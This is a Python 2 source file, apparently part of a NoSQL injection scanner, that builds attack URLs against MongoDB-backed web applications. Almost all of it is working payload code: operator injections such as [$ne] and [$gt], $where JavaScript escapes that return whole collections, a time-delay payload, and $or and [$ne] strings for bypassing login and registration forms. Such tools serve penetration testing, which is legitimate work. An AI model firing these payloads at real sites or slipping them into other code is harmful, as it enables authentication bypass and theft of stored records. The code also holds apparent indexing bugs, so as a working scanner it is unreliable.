global yes_tag
global no_tag
yes_tag = ['y','Y']
no_tag = ['n','N']
def buildAttackUri(origUri, randValue):
    attackSum = 19
    attackEffectiveSum = 11
    attackEffectiveSum_for_usernameAndPassword = 3
    attackSet=["","","","","","","","","","","","","","","","","","",""]
    attackSet[0] = "=" + randValue + "&"#normal uri which be used to test the length of response
    attackSet[1] = "[$ne]=" + randValue + "&"
    attackSet[2] =  "=a'; return db.a.find(); var dummy='!" + "&"
    attackSet[3] = "=1; return db.a.find(); var dummy=1" + "&"
    attackSet[4] ="=a'; return db.a.findOne(); var dummy='!" + "&"
    attackSet[5]="=1; return db.a.findOne(); var dummy=1" + "&"
    attackSet[6]="=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
    attackSet[7]="=1; return this.a !=" + randValue + "; var dummy=1" + "&"
    attackSet[8]="[$gt]=1&"
    attackSet[9] = "=2;return true;}///"
#    attackSet[9]="=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
#    attackSet[10]="=a\"; return db.a.find(); var dummy='!" + "&"
#    attackSet[11]="=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
#    attackSet[12]="=a\"; return db.a.findOne(); var dummy=\"!" + "&"
#    attackSet[13]="=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
#    attackSet[14]="a'; return true; var dum='a"
#    attackSet[15]="1; return true; var dum=2"
#    attackSet[16]="=a\'; ---"
#    attackSet[17]="=1; if ---"
    attackSet[10]="=12;var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/100 < 10); return true;}///"
    paramNames = []
    paramValue = []
    uriArray = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]
    attackDescriptionSet = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]

    try:
        split_uri = origUri.split("?")
        params = split_uri[1].split("&")

    except:
        raw_input(
            "Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
        return

    for item in params:
        index = item.find("=")
        paramNames.append(item[0:index])
        paramValue.append(item[index + 1:len(item)])

    menuItem = 1
    print "List of parameters:"
    for params in paramNames:
        print str(menuItem) + "-" + params
        menuItem += 1
    try:
        optionParameter = raw_input("Inject for username and password?(Y/N)")
    except:
        raw_input("Something went wrong.  Press enter to return to the main menu...")
        return
    if optionParameter in no_tag:
        try:
            injIndex = raw_input("Which parameter should we inject? ")
            injOpt = str(paramNames[int(injIndex) - 1])
            print "Injecting the " + injOpt + " parameter..."

        except:
            raw_input("Something went wrong.  Press enter to return to the main menu...")
            return
        for index in range(0,attackSum):
            uriArray[index] = split_uri[0] + "?"
        index_paramName = 0
        for item in paramNames:
            if item == injOpt:
                for index in range(0,attackEffectiveSum):
                    uriArray[index] += paramNames[index_paramName] + attackSet[index]
            else:
                for index in range(0,attackEffectiveSum):
                    uriArray[index] += paramNames[index_paramName] + "=" + paramValue[index] + "&"
        index_paramName+=1
        for index in range(0,attackSum):
            uriArray[index]=uriArray[index][:-1]
        attackDescriptionSet[0] = attackEffectiveSum
        attackDescriptionSet[1] = "Testing Mongo PHP not equals associative array injection for all records...\n" + "Injecting " + uriArray[1]
        attackDescriptionSet[2] = "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n" + "Injecting " + uriArray[2]
        attackDescriptionSet[3] = "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n" + "Injecting " + uriArray[3]
        attackDescriptionSet[4] = "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n" + "Injecting " + uriArray[4]
        attackDescriptionSet[5] = "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n" + "Injecting " + uriArray[5]
        attackDescriptionSet[6] = "Testing Mongo this not equals string escape attack for all records...\n" + "Injecting " + uriArray[6]
        attackDescriptionSet[7] = "Testing Mongo this not equals integer escape attack for all records...\n" + "Injecting " + uriArray[7]
        attackDescriptionSet[8] = "Testing PHP/ExpressJS > undefined attack for all records...\n" + "Injecting " + uriArray[8]
        attackDescriptionSet[9] = "Testing Javascript injection\n" + "Injecting " + uriArray[9]
        attackDescriptionSet[10] = "Testing Javascript injection\n" + "Injecting " + uriArray[10]
        buildAttackSet = [[],[]]
        buildAttackSet[0] = uriArray
        buildAttackSet[1] = attackDescriptionSet;
        return buildAttackSet
    else:
        for index in range(0, attackSum):
            uriArray[index] = split_uri[0] + "?"
        indexParamName = 0
        sumParamName = len(paramNames)

        for index in range(0, attackEffectiveSum_for_usernameAndPassword):
            if index == 0:
                for indexParamName in range(0, sumParamName):
                    if indexParamName != sumParamName-1:
                        uriArray[index] += paramNames[indexParamName] + "[$ne]=1" + "&"
                    else:
                        uriArray[index] += paramNames[indexParamName] + "[$ne]=1"
            if index == 1:
                uriArray[index] += paramNames[0] + "=" + paramValue[0] + "',$or:[{},{'a':'a " + "&"
                uriArray[index] += paramNames[1] + "=" + "'}],$comment:'successful MongoDB"
            if index == 2:
                uriArray[index] += paramNames[0] + "=" + paramValue[0] + "&"
                uriArray[index] += paramNames[1] + "=" + paramValue[1]+ "','injection':'injection"
#        for index in range(0, attackSum):
#            uriArray[index] = uriArray[index][:-1] # delete the last "&" of URI
        attackDescriptionSet[0] = attackEffectiveSum_for_usernameAndPassword
        attackDescriptionSet[1] = "Testing Mongo PHP array injection for login...\n" + "Injecting " + uriArray[0]
        attackDescriptionSet[2] = "Testing Mongo shell injection for login...\n"+ "Injecting " + uriArray[1]
        attackDescriptionSet[3] = "Testing Mongo shell injection for register...\n"+ "Injecting " + uriArray[2]
        buildAttackSet = [[], []]
        buildAttackSet[0] = uriArray
        buildAttackSet[1] = attackDescriptionSet;
        return buildAttackSet